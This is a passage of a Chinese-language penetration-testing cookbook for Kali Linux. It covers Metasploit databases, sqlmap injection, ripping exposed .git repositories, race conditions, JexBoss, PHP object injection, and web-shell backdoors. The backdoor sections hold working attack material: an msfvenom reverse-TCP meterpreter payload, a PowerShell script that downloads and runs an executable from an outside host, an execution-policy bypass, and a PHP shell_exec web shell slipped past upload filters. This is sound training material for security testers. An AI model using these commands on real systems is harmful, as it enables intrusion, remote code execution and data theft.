![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/af6731d6-1700-4a87-bb00-b9390cc6effd.png)

资源脚本只是自动化 Metasploit 的一种方式；您可以在[`community.rapid7.com/community/metasploit/blog/2011/12/08/six-ways-to-automate-metasploit`](https://community.rapid7.com/community/metasploit/blog/2011/12/08/six-ways-to-automate-metasploit)中了解其他自动化 Metasploit 的方式。

# Metasploit 中的数据库

在 Kali Linux 中，我们必须在使用数据库功能之前设置数据库。

# 如何做…

以下步骤演示了数据库的设置：

1.  首先，我们使用以下命令启动`postgresql`服务器：

```
        service postgresql start  
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/75cdedfd-4341-4541-b9ac-2938b9a7a2bf.png)

1.  然后，我们创建数据库并初始化：

```
        msfdb init  
```

1.  完成后，我们加载`msfconsole`。现在我们可以在 Metasploit 中创建和管理工作空间。工作空间可以被视为一个空间，我们可以在其中保存所有 Metasploit 数据并进行分类。要设置新的工作空间，我们使用以下命令：

```
        workspace -a workspacename
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/438548c2-354b-4659-ab1f-82fdc7c75ade.png)

1.  要查看与工作空间相关的所有命令，我们可以执行以下命令：

```
 workspace -h  
```

1.  现在我们已经设置好了数据库和工作空间，我们可以使用各种命令与数据库进行交互。

1.  要将现有的 Nmap 扫描导入到我们的数据库中，我们使用以下命令：

```
        db_import  path/to/nmapfile.xml
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4478c309-75d2-4616-8dc6-fc6c63fd4abf.png)

1.  导入完成后，我们可以使用以下命令查看主机：

```
 hosts
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/266e7cd8-0819-4edc-a9a0-323bc2b6477c.png)

1.  只查看 IP 地址和操作系统类型，我们使用以下命令：

```
        hosts -c address,os_flavor
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f1ba6382-bac9-4b40-aa78-761d3cae2dd5.png)

1.  现在假设我们想要执行 TCP 辅助扫描。我们也可以将所有这些主机设置为辅助扫描的`RHOSTS`。我们使用以下命令来实现这一点：

```
        hosts -c address,os_flavor -R  
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4020a77c-f88c-445e-b1f4-d640e1bb0926.png)

1.  由于`RHOSTS`已经设置，它们可以在 Metasploit 中的任何所需模块中使用。

1.  让我们再看一个例子，我们导入的 Nmap 扫描已经包含了我们需要的所有数据。我们可以使用以下命令列出数据库中的所有服务：

```
        services
```

1.  要仅查看已启动的服务，我们可以使用`-u`开关：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2932bf4e-58b5-4ada-9ad2-901cf81a9510.png)

1.  我们甚至可以使用`-p`开关按特定端口查看列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/3f610f40-b83d-4e50-a504-ecab8ea4bc89.png)


# 第四章：Web 应用程序利用-超越 OWASP 十大

在本章中，我们将介绍以下示例：

+   使用 XSS 验证器利用 XSS

+   使用`sqlmap`进行注入攻击

+   拥有所有`.svn`和`.git`存储库

+   赢得竞争条件

+   使用 JexBoss 利用 JBoss

+   利用 PHP 对象注入

+   使用 Web shell 和 meterpreter 设置后门

# 介绍

在 OWASP 十大中，我们通常看到查找和利用漏洞的最常见方式。在本章中，我们将介绍在寻找 Web 应用程序中的漏洞时可能遇到的一些不常见情况。

# 使用 XSS 验证器利用 XSS

虽然 XSS 已经被 Burp、Acunetix 等各种工具检测到，但 XSS 验证器非常方便。它是专为自动验证 XSS 漏洞而设计的 Burp 入侵者和扩展程序。

它基于 SpiderLabs 的博客文章[`blog.spiderlabs.com/2013/02/server-site-xss-attack-detection-with-modsecurity-and-phantomjs.html`](http://blog.spiderlabs.com/2013/02/server-site-xss-attack-detection-with-modsecurity-and-phantomjs.html)。

# 做好准备

要在以下示例中使用该工具，我们需要在我们的机器上安装 SlimerJS 和 PhantomJS。

# 如何做...

以下步骤演示了 XSS 验证器：

1.  我们打开 Burp 并切换到扩展程序选项卡：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/340ecd29-1c09-4b7d-a6ed-ab0cc040f60c.png)

1.  然后，我们安装 XSS 验证器扩展程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/41724867-7fed-4714-b23c-3e42f3d6dcc3.png)

1.  安装完成后，我们将在 Burp 窗口中看到一个名为 xssValidator 的新选项卡：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/433f6113-9b8a-41df-a1c9-ac9421d41fb9.png)

1.  接下来，我们安装 PhantomJS 和 SlimerJS；这可以在 Kali 上用几个简单的命令完成。

1.  我们使用`wget`从互联网下载 PhantomJS 文件：

```
 sudo wget https://bitbucket.org/ariya/phantomjs/downloads/
        phantomjs-1.9.8-linux-x86_64.tar.bz2
```

1.  我们使用以下命令提取它：

```
 tar jxvf phantomjs-1.9.8-linux-x86_64.tar.bz2
```

以下截图显示了前面命令下载 PhantomJS 文件的文件夹：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d73703dd-292f-4cd3-bb74-af87cf63c49a.png)

1.  现在我们可以使用`cd`浏览文件夹，最简单的方法是将 PhantomJS 可执行文件复制到`/usr/bin`：

```
 cp phantomjs /usr/local/bin
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2d8228a7-84f6-454d-882e-f9c2ccc8fae7.png)

1.  要验证我们是否可以在终端中输入`phantomjs -v`命令并显示版本。

1.  类似地，要安装 SlimerJS，我们从官方网站下载它：

[`slimerjs.org/download.html`](http://slimerjs.org/download.html)。

1.  我们首先使用以下命令安装依赖项：

```
 sudo apt-get install libc6 libstdc++6 libgcc1 xvfb
```

1.  现在我们使用以下命令提取文件：

```
 tar jxvf slimerjs-0.8.4-linux-x86_64.tar.bz2
```

1.  然后，我们浏览目录，简单地将 SlimerJS 可执行文件复制到`/usr/local/bin`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/8a0702cc-7da1-477e-84f3-f2bf8462cab2.png)

1.  然后，我们执行以下命令：

```
 cp slimerjs /usr/local/bin/
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/41680f08-dd26-41ae-872e-b17546584451.png)

1.  现在我们需要导航到 XSS 验证器文件夹。

1.  然后，我们需要使用以下命令启动 PhantomJS 和 SlimerJS 服务器：

```
 phantomjs xss.js & slimerjs slimer.js &
```

1.  服务器运行后，我们返回到 Burp 窗口。在右侧的 XSS 验证器选项卡中，我们将看到扩展程序将在请求上测试的负载列表。我们也可以手动输入我们自己的负载：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/795477e2-b319-41b8-b6c1-518d46c81cfc.png)

1.  接下来，我们捕获需要验证 XSS 的请求。

1.  我们选择发送到入侵者选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/48b5b90e-f0fa-463e-986f-e85f3d6d309a.png)

1.  然后，我们切换到入侵者窗口，在位置选项卡下，设置我们想要测试 XSS 负载的位置。用`§`包围的值是攻击期间将插入负载的位置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/12c86f32-6eab-428f-9355-283e29dc5720.png)

1.  在负载选项卡中，我们将负载类型选择为扩展生成的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f06ce3bb-6051-4cfe-90ac-e667045c54eb.png)

1.  在负载选项中，我们点击选择生成器...并选择 XSS 验证器负载：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/653b5ad9-e114-476c-9b29-42a70d8450bf.png)

1.  接下来，我们切换到 XSS 验证器选项卡，并复制 Grep 短语；这个短语也可以自定义：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a8e61d10-0658-4bd6-8d25-38b95d66cd15.png)

1.  接下来，我们切换到 Intruder 选项卡中的选项，并在 Grep - Match 中添加复制的短语：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a80d507b-e6b1-4dbb-8349-099cf3a6ab5b.png)

1.  我们点击开始攻击，然后我们会看到一个弹出窗口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b5aa5280-5e74-400e-b817-4336f3e591c1.png)

1.  在这里，我们将看到在我们的 Grep 短语列中带有检查标记的请求已成功验证：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/014009ae-d513-447c-ba6e-468bdc026942.png)

# 使用 sqlmap 进行注入攻击

`sqlmap`工具是一个用 Python 构建的开源工具，允许检测和利用 SQL 注入攻击。它完全支持 MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM Db2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB 和 Informix 数据库。在这个食谱中，我们将介绍如何使用 sqlmap 来测试和利用 SQL 注入。

# 如何做...

以下是使用`sqlmap`的步骤：

1.  我们首先查看`sqlmap`的帮助，以更好地了解其功能。这可以使用以下命令完成：

```
 sqlmap -h
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/c825353f-95f8-4485-a504-ffed2f2db7b1.png)

1.  要扫描 URL，我们使用以下命令：

```
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"
```

1.  一旦检测到 SQL，我们可以选择是（`Y`）跳过其他类型的有效载荷：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ad4a1923-1b9b-4708-a428-b7879594a9f3.png)

1.  一旦检测到 SQL，我们可以使用`--dbs`标志列出数据库名称：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/bca5b5f9-b626-4e6c-b1cc-27064df38efa.png)

1.  我们现在有了数据库；同样，我们可以使用`--tables`和`--columns`等标志来获取表名和列名：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b87d57a3-41e6-46c0-9655-ccffa009ad42.png)

1.  要检查用户是否是数据库管理员，我们可以使用`--is-dba`标志：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/1f84de64-83b1-47d0-a6d7-4d3571701b52.png)

1.  `sqlmap`命令有很多标志。我们可以使用以下表格来查看不同类型的标志以及它们的作用：

| **标志** | **操作** |
| --- | --- |
| `--tables` | 转储所有表名 |
| `-T` | 指定要执行操作的表名 |
| `--os-cmd` | 执行操作系统命令 |
| `--os-shell` | 提示系统命令 shell |
| `-r` | 指定要在其上运行 SQL 测试的文件名 |
| `--dump-all` | 转储所有内容 |
| `--tamper` | 使用篡改脚本 |
| `--eta` | 显示剩余的估计时间以转储数据 |
| `--dbs=MYSql,MSSQL,Oracle` | 我们可以手动选择数据库，仅对特定类型的数据库执行注入 |
| `--proxy` | 指定代理 |

# 另请参阅

+   *使用 Web shell 的后门*食谱

+   *使用 meterpreters 的后门*食谱

# 拥有所有的.svn 和.git 存储库

该工具用于破解版本控制系统，如 SVN、Git 和 Mercurial/hg、Bazaar。该工具是用 Python 构建的，使用起来非常简单。在这个食谱中，您将学习如何使用该工具来破解存储库。

这种漏洞存在是因为大多数情况下，在使用版本控制系统时，开发人员会将他们的存储库托管在生产环境中。留下这些文件夹允许黑客下载整个源代码。

# 如何做...

以下步骤演示了存储库的使用：

1.  我们可以从 GitHub 下载`dvcs-ripper.git`：

```
 git clone https://github.com/kost/dvcs-ripper.git
```

1.  我们浏览`dvcs-ripper`目录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/5dfd0caa-7f46-4707-8980-420bb267ffbb.png)

1.  要破解 Git 存储库，命令非常简单：

```
 rip-git.pl -v -u http://www.example.com/.git/
```

1.  我们让它运行，然后我们应该看到一个`.git`文件夹被创建，在其中，我们应该看到源代码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/cc8d52b0-a1c6-49b6-9cfa-35c50a10acf9.png)

1.  同样，我们可以使用以下命令来破解 SVN：

```
 rip-svn.pl -v -u http://www.example.com/.svn/
```

# 赢得竞争条件

当在多线程 Web 应用程序中对相同数据执行操作时，会发生竞争条件。当执行一个操作的时间影响另一个操作时，它基本上会产生意外的结果。

具有竞争条件漏洞的应用程序的一些示例可能是允许从一个用户向另一个用户转移信用的应用程序，或者允许添加折扣券代码以获得折扣的应用程序，这也可能存在竞争条件，这可能允许攻击者多次使用相同的代码。

# 如何做...

我们可以使用 Burp 的入侵者执行竞争条件攻击，如下所示：

1.  我们选择请求，然后单击“发送到入侵者”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ed7fba7b-5504-46f1-8edd-b03504d7598e.png)

1.  我们切换到选项选项卡，并设置我们想要的线程数，通常`20`到`25`就足够了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/5bbe6543-a0bc-4ec0-81c2-45a7fe3217a9.png)

1.  然后，在有效载荷选项卡中，我们选择有效载荷类型中的空有效载荷，因为我们要重播相同的请求：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/1c034f5f-ccbc-4756-a1dd-32cfb88d2142.png)

1.  然后，在有效载荷选项中，我们选择要播放请求的次数。

1.  由于我们实际上不知道应用程序的性能如何，因此无法完全猜测我们需要重播请求的次数。

1.  现在，我们点击“开始攻击”。如果攻击成功，我们应该看到期望的结果。

# 另请参阅

您可以参考以下文章以获取更多信息：

+   [`antoanthongtin.vn/Portals/0/UploadImages/kiennt2/KyYeu/DuLieuTrongNuoc/Dulieu/KyYeu/07.race-condition-attacks-in-the-web.pdf`](http://antoanthongtin.vn/Portals/0/UploadImages/kiennt2/KyYeu/DuLieuTrongNuoc/Dulieu/KyYeu/07.race-condition-attacks-in-the-web.pdf)

+   [`sakurity.com/blog/2015/05/21/starbucks.html`](https://sakurity.com/blog/2015/05/21/starbucks.html)

+   [`www.theregister.co.uk/2016/10/21/linux_privilege_escalation_hole/`](http://www.theregister.co.uk/2016/10/21/linux_privilege_escalation_hole/)

# 使用 JexBoss 利用 JBoss

JexBoss 是用于测试和利用 JBoss 应用服务器和其他 Java 应用服务器（例如 WebLogic，GlassFish，Tomcat，Axis2 等）中的漏洞的工具。

它可以在[`github.com/joaomatosf/jexboss`](https://github.com/joaomatosf/jexboss)下载。

# 如何做...

我们首先导航到我们克隆 JexBoss 的目录，然后按照给定的步骤进行操作：

1.  我们使用以下命令安装所有要求：

```
 pip install -r requires.txt
```

以下屏幕截图是上述命令的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/6f40d300-f99a-498f-a52e-bc78a6412ac6.png)

1.  要查看帮助，我们输入以下内容：

```
 python jexboss.py -h
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0434aeba-f83b-4617-a7ac-a6017da624e6.png)

1.  要利用主机，我们只需输入以下命令：

```
 python jexboss.py -host http://target_host:8080
```

以下屏幕截图是上述命令的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2110d739-1384-45d6-8981-7e1cc22f5e8b.png)

这向我们展示了漏洞。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9cd41e0b-44f8-4fa0-a77b-e102ad4e3251.png)

1.  我们输入`yes`以继续利用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/8f96a6d4-16ef-4f7d-9c94-68c1f245188f.png)

1.  这给我们在服务器上提供了一个 shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/cc88ef97-f384-4230-8b44-ca2766686425.png)

# 利用 PHP 对象注入

当不安全的用户输入通过 PHP `unserialize()`函数传递时，就会发生 PHP 对象注入。当我们将一个类的对象的序列化字符串传递给应用程序时，应用程序会接受它，然后 PHP 会重建对象，并且通常会调用魔术方法（如果它们包含在类中）。一些方法是`__construct()`，`__destruct()`，`__sleep()`和`__wakeup()`。

这导致 SQL 注入，文件包含，甚至远程代码执行。但是，为了成功利用这一点，我们需要知道对象的类名。

# 如何做...

以下步骤演示了 PHP 对象注入：

1.  在这里，我们有一个应用程序，它在`get`参数中传递序列化数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/23b23bcb-dc82-4f1d-9028-5c27fb399a67.png)

1.  由于我们有源代码，我们将看到该应用程序正在使用`__wakeup()`函数，类名为`PHPObjectInjection`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/8646771c-8982-4e2e-86d5-376fc9d64923.png)

1.  现在我们可以编写一个具有相同类名的代码，以生成包含我们要在服务器上执行的自己的命令的序列化对象：

```
        <?php
            class PHPObjectInjection{
                 public $inject = "system('whoami');";
            }
            $obj = new PHPObjectInjection;
            var_dump(serialize($obj));
        ?>
```

1.  我们将代码保存为 PHP 文件并运行代码，我们应该有序列化的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/722b5d72-d65b-4dbf-a47c-b963ad9be4eb.png)

1.  我们将此输出传递到`r`参数中，我们看到这里显示用户：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/45e43049-e12f-47a4-aa54-aed864c3dd94.png)

1.  让我们尝试传递另一个命令，`uname -a`。我们使用我们创建的 PHP 代码生成它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/baba11b2-ced5-44a8-9be8-3481636bf437.png)

1.  然后我们将输出粘贴到 URL 中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/1f6d11b5-85fe-4ebc-8495-9c6469c8c82c.png)

1.  现在我们看到正在执行的命令，输出如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/8cb4d30f-41cf-41c2-94f9-e2aa8e980bee.png)

# 另请参阅

+   [`mukarramkhalid.com/php-object-injection-serialization/#poi-example-2`](https://mukarramkhalid.com/php-object-injection-serialization/#poi-example-2)

+   [`crowdshield.com/blog.php?name=exploiting-php-serialization-object-injection-vulnerabilities`](https://crowdshield.com/blog.php?name=exploiting-php-serialization-object-injection-vulnerabilities)

+   [`www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/`](https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/)

# 使用 web shell 的后门

上传 web shell 很有趣；上传 web shell 可以让我们在服务器上更多地浏览。在这个教程中，您将学习一些我们可以在服务器上上传 shell 的方法。

# 如何做...

以下步骤演示了 web shell 的使用：

1.  我们首先通过使用`--is-dba`标志运行 sqlmap 来检查用户是否为 DBA：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/19a19e66-693e-4efd-ab17-53108d5e0191.png)

1.  然后，我们使用`os-shell`，它提示我们一个 shell。然后我们运行命令来检查我们是否有权限：

```
 whoami
```

前面的命令的示例如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/bcc389a3-6623-49f8-9750-e21e2cbf1cd5.png)

1.  幸运的是，我们有管理员权限。但我们没有 RDP 可以提供给外部用户。让我们尝试另一种方法，使用 PowerShell 获取 meterpreter 访问权限。

1.  我们首先创建一个`System.Net.WebClient`对象，并将其保存为 PowerShell 脚本在系统上：

```
 echo $WebClient = New-Object System.Net.WebClient > abc.ps1
```

1.  现在我们通过以下命令使用`msfvenom`创建我们的`meterpreter.exe`：

```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address>
    LPORT=<Your Port to Connect On> -f exe > shell.exe
```

1.  现在，我们需要下载我们的 meterpreter，所以我们在我们的`abc.ps1`脚本中添加以下命令：

```
 echo $WebClientDownloadFile(http://odmain.com/meterpreter.exe,
        "D:\video\b.exe") >> abc.ps1
```

以下截图是前面命令的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/1146fc5b-8f64-4155-b5f9-0d63506a28b6.png)

1.  默认情况下，PowerShell 配置为阻止在 Windows 系统上执行`.ps1`脚本。但仍有一种惊人的方法可以执行脚本。我们使用以下命令：

```
 powershell -executionpolicy bypass -file abc.ps1
```

前面的命令的示例如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/75492280-4ddf-433d-bc55-8d3b0e6e40f2.png)

1.  接下来，我们转到目录`D:/video/meterpreter.exe`，我们的文件已下载，并使用以下命令执行它：

```
 msfconsole
```

前面的命令将打开 msf，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2bef0c4f-faa1-4b6f-98f0-6436fede6833.png)

# 使用 meterpreter 的后门

有时，我们可能还会遇到最初用于上传文件（如 Excel、照片等）的文件上传，但有一些方法可以绕过它。在这个教程中，您将看到如何做到这一点。

# 如何做...

以下步骤演示了 meterpreter 的使用：

1.  在这里，我们有一个上传照片的 web 应用程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/20015428-2d33-4c72-aac2-2e4987f00419.png)

1.  当我们上传照片时，这是我们在应用程序中看到的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/32380e31-b3f9-4a6b-bfd6-db71db172b93.png)

1.  让我们看看如果我们上传一个`.txt`会发生什么。我们创建一个带有测试数据的文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d2d5ccb1-bb1a-4673-9073-d3d74b8e2718.png)

1.  让我们尝试上传它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/538fb14d-b1b3-4931-adc0-a04bb9cbee66.png)

1.  我们的图片已被删除！这可能意味着我们的应用程序正在进行客户端或服务器端的文件扩展名检查：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/66cfba69-5774-4673-bf53-5286ebc30ec4.png)

1.  让我们尝试绕过客户端检查。我们在 Burp 中拦截请求，尝试更改提交的数据中的扩展名：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/3c2bce9c-ab7c-4fb5-92d1-4d09356abbdc.png)

1.  现在我们将扩展名从`.txt`更改为`.txt;.png`，然后点击前进：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a58f8519-a8e2-4d6c-a521-e0495ed45262.png)

这仍在被删除，这告诉我们应用程序可能具有服务器端检查。

绕过的一种方法是在我们想要执行的代码中添加一个图像的头部。

1.  我们添加头部`GIF87a`并尝试上传文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b64944a2-7953-471b-b410-37cc790ab763.png)

然后我们上传这个：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/59b34ecd-7496-47c1-a47d-d5e0d54c7593.png)

1.  我们看到文件已经上传。

1.  现在我们尝试添加我们的 PHP 代码：

```
        <?php
            $output = shell_exec('ls -lart');
            echo "<pre>$output</pre>";
        ?>
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0725ad0d-0e6a-42cc-acca-471888d6c322.png)

但是我们的 PHP 仍未被执行。

1.  然而，还有其他文件格式，如`.pht`、`.phtml`、`.phtm`、`.htm`等。让我们尝试`.pht`。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2a642eab-1083-4d72-a8bb-25bf4b6201d7.png)

我们的文件已经上传。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/259298d1-2bc0-4060-9a5d-6f03c2a172c1.png)

1.  我们浏览文件并看到它已被执行！

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/814041e7-29f8-46d2-954c-5e4f6659f83f.png)

1.  让我们尝试执行一个基本命令：

```
 ?c=whoami
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b6146f1b-ff1d-4e40-bb72-47c67a5fba9b.png)

我们可以看到我们的命令已成功执行，我们已经在服务器上上传了我们的 shell。
